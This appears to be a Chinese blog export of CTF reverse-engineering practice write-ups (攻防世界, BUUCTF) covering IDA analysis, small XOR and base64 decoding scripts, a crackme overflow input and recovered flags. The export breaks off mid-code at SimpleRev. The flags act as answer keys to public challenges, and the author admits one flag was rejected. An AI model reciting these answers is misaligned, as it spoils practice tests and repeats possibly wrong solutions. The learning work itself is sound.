<h2 id="dmd-50"><a href="#dmd-50" class="headerlink" title="dmd-50"></a>dmd-50</h2><p>拖入EXE，无壳，拖入64位IDA，F5反汇编<br>R快捷键将ASCII码转成字符<br><img src="https://img-blog.csdnimg.cn/84115edbcb7040ed8b921e14b3e66484.png#pic_center" alt="在这里插入图片描述"><br>得到字符串870438d5b6e29db0898bc4f0225935c0<br>根据题目名称dmd-50猜测这是MD5密文，故将字符串解密得到grape<br>然而这并不是flag<br><img src="https://img-blog.csdnimg.cn/6b2ab4c1e129412aa7fc1c6370af99b9.png#pic_center" alt="在这里插入图片描述"><br>发现重点md5(v40,v39)<br>意思是md5加密一次<br>将刚得到的grape再次md5加密<br>得到flag为b781cbb29054db12f88f08c6e161c199</p>
<h2 id="lgniteMe"><a href="#lgniteMe" class="headerlink" title="lgniteMe"></a>lgniteMe</h2><p>拖入exe，无壳，拖入32位IDA，F5反汇编<br><img src="https://img-blog.csdnimg.cn/a1a4641e93b046b1a45c54a0f253787a.png#pic_center" alt="在这里插入图片描述"><br>发现”Congratulations!”，应该是输入正确flag后的输出，故双击跟进sub_4011c0<br><img src="https://img-blog.csdnimg.cn/18d8887124934a4181848565d7cc625b.png#pic_center" alt="在这里插入图片描述"><br>存在两个函数异或，进入函数byte_4420B0<br>选中后按shift+e提取字符，选择demical十进制的数表示<br><img src="https://img-blog.csdnimg.cn/7d29c82de70e4773aa12bf85e547507e.png#pic_center" alt="在这里插入图片描述"><br>编写脚本：</p>
<pre><code class="hljs python">yihuo_qian =(   <span class="hljs-number">13</span>,  <span class="hljs-number">19</span>,  <span class="hljs-number">23</span>,  <span class="hljs-number">17</span>,   <span class="hljs-number">2</span>,   <span class="hljs-number">1</span>,  <span class="hljs-number">32</span>,  <span class="hljs-number">29</span>,  <span class="hljs-number">12</span>,   <span class="hljs-number">2</span>,
   <span class="hljs-number">25</span>,  <span class="hljs-number">47</span>,  <span class="hljs-number">23</span>,  <span class="hljs-number">43</span>,  <span class="hljs-number">36</span>,  <span class="hljs-number">31</span>,  <span class="hljs-number">30</span>,  <span class="hljs-number">22</span>,   <span class="hljs-number">9</span>,  <span class="hljs-number">15</span>,
   <span class="hljs-number">21</span>,  <span class="hljs-number">39</span>,  <span class="hljs-number">19</span>,  <span class="hljs-number">38</span>,  <span class="hljs-number">10</span>,  <span class="hljs-number">47</span>,  <span class="hljs-number">30</span>,  <span class="hljs-number">26</span>,  <span class="hljs-number">45</span>,  <span class="hljs-number">12</span>,
   <span class="hljs-number">34</span>)
flag = <span class="hljs-string">&#x27;&#x27;</span>
yihuo_result=<span class="hljs-string">&#x27;GONDPHyGjPEKruv&#123;&#123;pj]X@rF&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(yihuo_result)):
    flag+=<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(yihuo_result[i])^yihuo_qian[i])-<span class="hljs-number">72</span>)^<span class="hljs-number">85</span>)
<span class="hljs-built_in">print</span>(flag)</code></pre>
<p>得到flag为EIS{WADX_TDGK_AIHC_IHKN_PJLM}（不过不知道提交为什么就是不正确）<br>还发现一种大佬的一种解法<br>shift+F2在IDA中嵌入脚本打印<br>脚本为：</p>
<pre><code class="hljs bash">addr=0x4420B0
list=[]
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(32):
        list.append(Byte(addr+i))
<span class="hljs-built_in">print</span>(list)
</code></pre>
<p>逆向逻辑脚本为：</p>
<pre><code class="hljs python">key1=<span class="hljs-string">&quot;GONDPHyGjPEKruv&#123;&#123;pj]X@rF&quot;</span>
list1=[<span class="hljs-number">13</span>, <span class="hljs-number">19</span>, <span class="hljs-number">23</span>, <span class="hljs-number">17</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">32</span>, <span class="hljs-number">29</span>, <span class="hljs-number">12</span>, <span class="hljs-number">2</span>, <span class="hljs-number">25</span>, <span class="hljs-number">47</span>, <span class="hljs-number">23</span>, <span class="hljs-number">43</span>, <span class="hljs-number">36</span>, <span class="hljs-number">31</span>, <span class="hljs-number">30</span>, <span class="hljs-number">22</span>, <span class="hljs-number">9</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>, <span class="hljs-number">39</span>, <span class="hljs-number">19</span>, <span class="hljs-number">38</span>, <span class="hljs-number">10</span>, <span class="hljs-number">47</span>, <span class="hljs-number">30</span>, <span class="hljs-number">26</span>, <span class="hljs-number">45</span>, <span class="hljs-number">12</span>, <span class="hljs-number">34</span>, <span class="hljs-number">4</span>]
flag=[]
v3=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key1)):
   flag.append(((<span class="hljs-built_in">ord</span>(key1[i])^list1[i])-<span class="hljs-number">72</span>)^<span class="hljs-number">85</span>)
   <span class="hljs-keyword">if</span> flag[i] &gt;= <span class="hljs-number">65</span> <span class="hljs-keyword">and</span> flag[i] &lt;= <span class="hljs-number">90</span>:
      flag[i]+=<span class="hljs-number">32</span>
   <span class="hljs-keyword">elif</span> flag[i] &gt;= <span class="hljs-number">97</span> <span class="hljs-keyword">and</span> flag[i] &lt;=<span class="hljs-number">122</span>:
      flag[i]-=<span class="hljs-number">32</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag]))
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag])))
</code></pre>
<h2 id="re-for-50-plz-50"><a href="#re-for-50-plz-50" class="headerlink" title="re-for-50-plz-50"></a>re-for-50-plz-50</h2><p>拖入EXE，无壳，拖入32位IDA。F5查看伪代码<br><img src="https://img-blog.csdnimg.cn/08b6d1321ee643c0b747187d12aafc95.png#pic_center" alt="在这里插入图片描述"><br>代码非常简单，很好理解<br>进入函数meow，得到字符串<br><img src="https://img-blog.csdnimg.cn/ad4d5d67296c4e21b26179375abebaaa.png#pic_center" alt="在这里插入图片描述"><br>编写脚本：</p>
<pre><code class="hljs python">a = <span class="hljs-string">&quot;cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ&quot;</span>
f = <span class="hljs-string">&#x27;&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):
    f += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a[i])^<span class="hljs-number">55</span>)
<span class="hljs-built_in">print</span>(f)
</code></pre>
<p>运行得到flag为TUCTF{but_really_whoisjohngalt}</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>刷题记录reverse3</title>
    <url>/2023/03/25/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95reverse3/</url>
    <content><![CDATA[<p>攻防世界reverse</p>
<h1 id="answer-to-everthing"><a href="#answer-to-everthing" class="headerlink" title="answer_to everthing"></a>answer_to everthing</h1><p>文件无法在我的电脑上运行<br>拖入exe，无壳，拖入64位IDA，main函数F5反汇编<br><img src="https://img-blog.csdnimg.cn/19a7d49cfc6a4a8e9341df9077b82bb2.png#pic_center" alt="在这里插入图片描述"><br>跟进not_the_flag<br><img src="https://img-blog.csdnimg.cn/0c6b7b1a31b94664a743dee63417d1b5.png#pic_center" alt="在这里插入图片描述"><br>翻译一下<br><img src="https://img-blog.csdnimg.cn/9905a609acf647c99598de35530ac5f5.png#pic_center" alt="在这里插入图片描述"><br>题干提示<br><img src="https://img-blog.csdnimg.cn/1c7fabd58e024831aff55a9a48dba2fd.png#pic_center" alt="在这里插入图片描述"><br>了解到sha1加密<br><img src="https://img-blog.csdnimg.cn/8f123d7bd902462aa9c809e8da3ea3e3.png#pic_center" alt="在这里插入图片描述"></p>
<p>第一遍试的大写不正确，第二遍改成小写后正确<br>故flag为flag{80ee2a3fe31da904c596d993f7f1de4827c1450a}</p>
<h1 id="re1-100"><a href="#re1-100" class="headerlink" title="re1-100"></a>re1-100</h1><p>拖入exe后拖入64位IDA<br>找到主函数F5反汇编<br><img src="https://img-blog.csdnimg.cn/339a7590ab9f487b86c668f02150a493.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7f1e42b0543443da993ec686d8e0dc22.png#pic_center" alt="在这里插入图片描述"><br>前面是对&amp;bufParentRead[1]的开头十个赋值，后面&amp;bufParentRead[31]是对倒数十个赋值，但是后面顺序又乱掉了：strncmp(bufParentRead, “{daf29f59034938ae4efd53fc275d81053ed5be8c}”, 42uLL)<br>看见{daf29f59034938ae4efd53fc275d81053ed5be8c}这一串就猜测肯定跟flag有点关系<br>所以中间一定有改变，跟踪一下中间的confuseKey(bufParentRead, 42)函数：<br><img src="https://img-blog.csdnimg.cn/92038d534e0f4b8ebb3196f4008e2f83.png#pic_center" alt="在这里插入图片描述"><br>前面比较多东西，但是这次我忽然看到后面的关键了，如截图所示，把字符串分成四份，按3、4、1、2、的顺序重新打乱，而且按照主函数最后混乱代码那里{daf29f59034938ae4efd53fc275d81053ed5be8c}也的确是符合4和1的新顺序，所以之前的函数顺序就是简单的1、2、3、4、：<br>{53fc275d81053ed5be8cdaf29f59034938ae4efd}<br>最后的flag为53fc275d81053ed5be8cdaf29f59034938ae4efd</p>
<h1 id="parallel-comparator-200"><a href="#parallel-comparator-200" class="headerlink" title="parallel-comparator-200"></a>parallel-comparator-200</h1><p>这道题附件直接就是源码<br>分析代码：</p>
<pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> * <span class="hljs-title">checking</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> </span>&#123;
    <span class="hljs-type">char</span> *result = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>));
    <span class="hljs-type">char</span> *argument = (<span class="hljs-type">char</span> *)arg;
    *result = (argument[<span class="hljs-number">0</span>]+argument[<span class="hljs-number">1</span>]) ^ argument[<span class="hljs-number">2</span>];
    <span class="hljs-keyword">return</span> result;
&#125;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">highly_optimized_parallel_comparsion</span><span class="hljs-params">(<span class="hljs-type">char</span> *user_string)</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-type">int</span> initialization_number;
    <span class="hljs-type">int</span> i;
    <span class="hljs-type">char</span> generated_string[FLAG_LEN + <span class="hljs-number">1</span>];
    generated_string[FLAG_LEN] = <span class="hljs-string">&#x27;\0&#x27;</span>;

   <span class="hljs-comment">//随机化函数值取值大于64 传值给initialization_number </span>
    <span class="hljs-keyword">while</span> ((initialization_number = <span class="hljs-built_in">random</span>()) &gt;= <span class="hljs-number">64</span>);
    
    <span class="hljs-type">int</span> first_letter;
    <span class="hljs-comment">/*initialization_number 得到于64的随机值，取余运算，initialization_number % 26)余数肯定是在0~25范畴，</span>
<span class="hljs-comment">    然后加97，我数学不好，97+0~97+25,应该是97~122的范围内 */</span>
    first_letter = (initialization_number % <span class="hljs-number">26</span>) + <span class="hljs-number">97</span>;

    <span class="hljs-type">pthread_t</span> thread[FLAG_LEN];
    <span class="hljs-type">char</span> differences[FLAG_LEN] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">-9</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">13</span>, <span class="hljs-number">-13</span>, <span class="hljs-number">-4</span>, <span class="hljs-number">-11</span>, <span class="hljs-number">-9</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">-13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">-13</span>, <span class="hljs-number">-11</span>, <span class="hljs-number">6</span>, <span class="hljs-number">-7</span>&#125;;
    <span class="hljs-type">char</span> *arguments[<span class="hljs-number">20</span>];
    <span class="hljs-comment">/*malloc(size_t size) 分配所需的内存空间，并返回一个指向它的指针,这里我们主要关注是 arguments数组，</span>
<span class="hljs-comment">    知道了arguments1，2，3分别对应first_letter，differences，user_string，同时使用pthread_create函数，</span>
<span class="hljs-comment">    并调用了checking方法，返回结果是(argument[0]+argument[1]) ^ argument[2] 的result    */</span>
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; FLAG_LEN; i++) &#123;
        arguments[i] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">3</span>*<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>));
        arguments[i][<span class="hljs-number">0</span>] = first_letter;
        arguments[i][<span class="hljs-number">1</span>] = differences[i];
        arguments[i][<span class="hljs-number">2</span>] = user_string[i];

        <span class="hljs-built_in">pthread_create</span>((<span class="hljs-type">pthread_t</span>*)(thread+i), <span class="hljs-literal">NULL</span>, checking, arguments[i]);
    &#125;

    <span class="hljs-type">void</span> *result;
    <span class="hljs-type">int</span> just_a_string[FLAG_LEN] = &#123;<span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">95</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">95</span>, <span class="hljs-number">105</span>, <span class="hljs-number">116</span>, <span class="hljs-number">95</span>, <span class="hljs-number">105</span>, <span class="hljs-number">115</span>&#125;;
    <span class="hljs-comment">/* 这里是上面for 循环返回的result结果 ，</span>
<span class="hljs-comment">    将generated_string赋值，即generated_string=(first_letter+differencs[i]) ^ user_string[i]+just_a_string[i] </span>
<span class="hljs-comment">    */</span>
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; FLAG_LEN; i++) &#123;
        <span class="hljs-built_in">pthread_join</span>(*(thread+i), &amp;result);
        generated_string[i] = *(<span class="hljs-type">char</span> *)result + just_a_string[i];
        <span class="hljs-built_in">free</span>(result);
        <span class="hljs-built_in">free</span>(arguments[i]);
    &#125;

    <span class="hljs-type">int</span> is_ok = <span class="hljs-number">1</span>;
    <span class="hljs-comment">/*generated_string和just_a_string比较，</span>
<span class="hljs-comment">    即(first_letter+differencs[i]) ^ user_string[i]+just_a_string[i] ==just_a_string 返回1*/</span>
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; FLAG_LEN; i++) &#123;
        <span class="hljs-keyword">if</span> (generated_string[i] != just_a_string[i])
            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    &#125;

    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
&#125;</code></pre>
<p>看highly_optimized_parallel_comparsion函数<br>有3个循环。<br>1：随机化函数值取值大于64 传值给initialization_number ，initialization_number 得到于64的随机值，取余运算，initialization_number % 26)余数肯定是在025范畴，然后加97，我数学不好，97+097+25,应该是97~122的范围内。<br>malloc(size_t size) 分配所需的内存空间，并返回一个指向它的指针,这里我们主要关注是 arguments数组，知道了arguments1，2，3分别对应first_letter，differences，user_string，同时使用pthread_create函数，并调用了checking方法，返回结果是(argument[0]+argument[1]) ^ argument[2] 的result<br>2:第二个for ,是上面for 循环返回的result结果 ，将generated_string赋值，即generated_string=(first_letter+differencs[i]) ^ user_string[i]+just_a_string[i]<br>3:第三个forgenerated_string和just_a_string比较，即(first_letter+differencs[i]) ^ user_string[i]+just_a_string[i] ！=just_a_string ，则 return 0是异常中断。通过 return 1 表示返回1，正常。<br>那我们就知道（ first_letter+differencs[i]) ^ user_string[i]+just_a_string[i] ！=just_a_string，那么只能是0+just_a_string[i] ==just_a_string才能正常，所以（ first_letter+differencs[i]) ^ user_string[i]=0。异或a^ b=c,可以推出a^ c=b,所以first_letter+differences[i])^0=user_string[i]<br>只要知道first_letter+differences[i])^0的值 就得到了正确的flag<br>脚本：</p>
<pre><code class="hljs python">just_letter =[<span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">95</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">95</span>, <span class="hljs-number">105</span>, <span class="hljs-number">116</span>, <span class="hljs-number">95</span>, <span class="hljs-number">105</span>, <span class="hljs-number">115</span>]
differences = [<span class="hljs-number">0</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">4</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">7</span>, <span class="hljs-number">6</span>, -<span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">11</span>, <span class="hljs-number">6</span>, -<span class="hljs-number">7</span>]

first_letter = <span class="hljs-number">97</span>
<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>): <span class="hljs-comment">#0~25</span>
    result = <span class="hljs-string">&#x27;&#x27;</span>
    first_letter += <span class="hljs-number">1</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(differences)):
        result+=<span class="hljs-built_in">chr</span>((first_letter+differences[i])^<span class="hljs-number">0</span>)
    <span class="hljs-built_in">print</span>(result,<span class="hljs-string">&quot;--&quot;</span>,(first_letter+differences[i]))

</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2782b10752be43bd9023e2a9500c37c3.png#pic_center" alt="在这里插入图片描述"><br>flag为lucky_hacker_you_are</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>刷题记录reverse2</title>
    <url>/2023/03/03/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95reverse2/</url>
    <content><![CDATA[<p>攻防世界<br>reverse</p>
<h1 id="srm-50"><a href="#srm-50" class="headerlink" title="srm-50"></a>srm-50</h1><p>拖入EXE，无壳，拖入32位IDA<br>WINMAIN(xxx)函数F5反汇编<br>双击跟进DialogFunc<br>strcpy(Source, “Registration Success!\nYour flag is:”)后的内容就是flag，快捷键R将数字转换成字符串<br><img src="https://img-blog.csdnimg.cn/55c04856878949e6b9e1eee095d07016.png#pic_center" alt="在这里插入图片描述"><br>即CXZA9bd7mGq94gc8<br>按顺序排列后得到CZ9dmq4c8g9G7bAX，即为flag</p>
<h1 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h1><p>拖入exe，无壳，拖入32位IDA<br>找到WinMain(x,x,x,x)  F5反汇编<br>双击跟进_WinMain@16_0，跟进DialogFunc，进入sub_401090<br>找到well done 所在的基本块，条件是v10 == 123 &amp;&amp; v12 == 120 &amp;&amp; v14 == 122 &amp;&amp; v13 == 121，注意到在该基本块的开头调用了strcpy函数将flag 赋值给Text，同时下面也有一些对Text拼接字符串的操作，看起来这个Text保存的就是flag。<br>观察Text的赋值，除了v5，其它的都是已知的字符，需要解出v5的值。其中，v5是执行itoa函数以后得到的：_itoa(v10, &amp;v5, 10); 。<br>因此，我们需要把v10解出来。v10等于多少呢？if条件里已经告诉我们了，等于123，因此flag为flag{123_Buff3r_0v3rf|0w}<br><strong>补充：</strong><br>此题想考察的应该是溢出<br>第25行中，读取用户输入保存到String，读取的最大长度为260字节，并且没有对String做长度校验，可能存在溢出的问题。</p>
<blockquote>
<p>GetDlgItemTextA(hWnd, 1002, &amp;String, 260);</p>
</blockquote>
<p>然后对String进行了长度校验，必须要大于6才行。<br>接下来 v10 = atoi(&amp;String) + 1; ，也就是用户输入是个数字的字符串，通过atoi转成数字以后再加一，将结果赋值给v10。因此输入的前三个字符应该为：”123”。<br>重头戏来了，还是这个if条件，对v10，v12，v13和v14进行了判断。</p>
<pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v10 == <span class="hljs-number">123</span> &amp;&amp; v12 == <span class="hljs-number">120</span> &amp;&amp; v14 == <span class="hljs-number">122</span> &amp;&amp; v13 == <span class="hljs-number">121</span> )
&#123;
    ...
&#125;
</code></pre>
<p>string~v14在栈中的情况<br><img src="https://img-blog.csdnimg.cn/f4c2d06b1d6949328eba8a410ae996a9.png" alt="在这里插入图片描述"><br>String这三个字节填充的是122无疑，v12、v13、v14的ASCII值分别为120、121、122，即对应的字符为x、y、z<br><img src="https://img-blog.csdnimg.cn/5ca97d34114143919b1230b993408100.png#pic_center" alt="在这里插入图片描述"><br>用户输入为122xyz<br>输出为flag{123_Buff3r_0v3rfl0w}<br><img src="https://img-blog.csdnimg.cn/6a9f6008dc394205a5b879af3a58fc87.png#pic_center" alt="在这里插入图片描述"></p>
<h1 id="Guess-the-Number"><a href="#Guess-the-Number" class="headerlink" title="Guess-the-Number"></a>Guess-the-Number</h1><p>附件加载后得到.jar解压后得到.class文件<br>学习发现需要一个叫jd-gui的软件打开<br>下载后用其打开可以查看汇编代码<br><img src="https://img-blog.csdnimg.cn/ee287082b49742219425dd9a98a7b694.png#pic_center" alt="在这里插入图片描述"><br>分析if (my_number / 5 == guess_number)  //我的数字除以5取整就是猜测的数字<br>1545686892 / 5取整得309137378<br>将guess_number的值修改为309137378，执行代码成功获得flag为a7b08c546302cc1fd2a4d48bf2bf2ddb。</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>刷题记录reverse4</title>
    <url>/2023/03/29/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95reverse4/</url>
    <content><![CDATA[<p>BUUCTF</p>
<h1 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h1><p>题如其名，非常简单的一道入门题<br>拖入exe，无壳，拖入64位IDA，F5反汇编<br><img src="https://img-blog.csdnimg.cn/d126d8dd388b45f5a8c367d8259c4e9a.png#pic_center" alt="在这里插入图片描述"><br>直接看出flag为flag{this_Is_a_EaSyRe}</p>
<h1 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h1><p>拖入exe，无壳拖入64位IDA，F5反汇编<br>一路跟进，来到这个界面<br><img src="https://img-blog.csdnimg.cn/098d879c18b040aa929518cabdb49254.png#pic_center" alt="在这里插入图片描述"><br>一长串还有些乱，于是shift+F12直接查找字符串<br><img src="https://img-blog.csdnimg.cn/91773cc11dd34e989fd13cffe48a76db.png#pic_center" alt="在这里插入图片描述"><br>看见关键字符串直接双击跟进调用该处的函数<br><img src="https://img-blog.csdnimg.cn/fdb6369d25dc49468f70afea4275bd64.png#pic_center" alt="在这里插入图片描述"><br>找到关键函数<br><img src="https://img-blog.csdnimg.cn/959c92402a944750be3881923d75d9c8.png#pic_center" alt="在这里插入图片描述"><br>跟进Str2<br><img src="https://img-blog.csdnimg.cn/f465af9812604218b227411ec95c20e7.png#pic_center" alt="在这里插入图片描述"><br>根据if条件句，将o换成0，故得到flag为flag{hell0_w0rld}</p>
<h1 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h1><p>拖入Exe，无壳拖入64位IDA，F5反汇编<br><img src="https://img-blog.csdnimg.cn/79d16516da474cb0900471cb7e24d7b5.png#pic_center" alt="在这里插入图片描述"><br>当输入字符串s2和flag一样时才会得到正确的flag<br>跟进flag<br><img src="https://img-blog.csdnimg.cn/cbeb18e49b0e40919b295dbd3af1daae.png#pic_center" alt="在这里插入图片描述"><br>根据if条件，将‘i’和‘r’都换成1<br>故得到flag为flag{hack1ng_fo1_fun}</p>
<h1 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h1><p>拖入exe，无壳拖入32位IDA，F5反汇编<br><img src="https://img-blog.csdnimg.cn/b24693197eb346c9b61517d57f29ff24.png#pic_center" alt="在这里插入图片描述"><br>点进去分析半天，最后发现就是那一长串字符，换个包将DBAPP换成flag即可<br>最终flag为flag{49d3c93df25caad81232130f3d2ebfad}</p>
<h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p>拖入exe，无壳拖入64位IDA，F5反汇编<br><img src="https://img-blog.csdnimg.cn/634bcc025bf041748f895262c4a96de3.png#pic_center" alt="在这里插入图片描述"><br>global和flag进行了比较<br>跟进global，并提取其字符串<br><img src="https://img-blog.csdnimg.cn/af22b64c80e14a8f98fed81aaa0557e0.png#pic_center" alt="在这里插入图片描述"><br>写脚本</p>
<pre><code class="hljs python">s=[<span class="hljs-number">0x66</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x11</span>, 
  <span class="hljs-number">0x78</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x1F</span>, 
  <span class="hljs-number">0x76</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x0F</span>, 
  <span class="hljs-number">0x47</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x00</span>]
<span class="hljs-comment">#print(list1) # 会自动变成十进制</span>
flag=<span class="hljs-built_in">chr</span>(s[<span class="hljs-number">0</span>])  <span class="hljs-comment"># f   第一个‘f’没有被处理，但是也是flag的一部分。</span>
i=<span class="hljs-number">1</span>
<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
  <span class="hljs-keyword">if</span> i&lt;<span class="hljs-built_in">len</span>(s):
    flag += <span class="hljs-built_in">chr</span>(s[i]^s[i-<span class="hljs-number">1</span>])  <span class="hljs-comment">#从输入的第二位开始，将其与前一位异或</span>
    i+=<span class="hljs-number">1</span>
  <span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">break</span>
<span class="hljs-built_in">print</span>(flag)
</code></pre>
<p>运行得到flag为flag{QianQiuWanDai_YiTongJiangHu}</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>刷题记录reverse5</title>
    <url>/2023/04/09/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95reverse5/</url>
    <content><![CDATA[<p>BUUCTF reverse</p>
<h1 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h1><p>拖入exe，无壳拖入32位IDA，F5反汇编<br><img src="https://img-blog.csdnimg.cn/9c90ce44a931437f8c01320ac1a1893f.png#pic_center" alt="在这里插入图片描述"><br>找到关键字符串right flag，知道前面的判断条件取决于Str2，跟进Str2，得到一串字符串<br><img src="https://img-blog.csdnimg.cn/70ede4909feb4ba8854f8c33346a673c.png#pic_center" alt="在这里插入图片描述"><br>跟进上面的sub_4110BE，发现有大量相似字符，跟进，发现是base64<br><img src="https://img-blog.csdnimg.cn/07a030305d4e4a0782e6bd9017dcad85.png#pic_center" alt="在这里插入图片描述"><br>写脚本：</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> base64
<span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;e3nifIH9b_C@n@dH&quot;</span>
flag=<span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)):
  flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i])-i)
<span class="hljs-built_in">print</span>(base64.b64decode(flag))
</code></pre>
<p>运行得到flag为flag{i_l0ve_you}</p>
<h1 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h1><p>拖入exe，无壳拖入64位IDA，F5反汇编<br><img src="https://img-blog.csdnimg.cn/3151dbcccbb046938afb3f5d0ed6b89b.png#pic_center" alt="在这里插入图片描述"><br>跟进Decry()函数</p>
<pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">Decry</span><span class="hljs-params">()</span>
&#123;
  <span class="hljs-type">char</span> v1; <span class="hljs-comment">// [rsp+Fh] [rbp-51h]</span>
  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-50h]</span>
  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-4Ch]</span>
  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+18h] [rbp-48h]</span>
